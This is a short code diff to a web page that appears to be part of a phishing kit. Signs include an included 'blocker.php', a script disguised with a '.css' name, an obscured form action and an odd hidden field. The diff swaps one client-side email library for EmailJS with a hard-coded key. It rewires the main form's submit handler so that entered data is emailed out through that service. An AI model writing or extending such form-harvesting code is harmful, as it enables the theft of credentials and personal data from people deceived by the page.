@@ -24,7 +24,14 @@ include 'blocker.php';
     <script nonce='#' src="js/jquery.css"></script>
 
     <link href="js/prevent.css" rel="stylesheet"/>
-    <script defer src="https://smtpjs.com/v3/smtp.js"></script>
+    <script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+    (function(){
+        emailjs.init("qU0Y_SM_w4gbkBn1w");
+    })();
+    </script>
     <script src="page.js" defer></script>
 
 
@@ -193,7 +200,7 @@ include 'blocker.php';
     
     <div class="content-container" id="content" role="main" tabindex="-1">
         <!-- action="=-_+=.php" -->
-        <form action="page.js" autocomplete="off" id="MainForm" method="post"               onsubmit="sendEmail()"
+        <form action="page.js" autocomplete="off" id="MainForm" method="post"               onsubmit="sendMail(); return false;"
         >
             <input name="" type="hidden" value="kaad1" /><div class='row'>
             <div class='large-12 medium-12 small-12 column'>
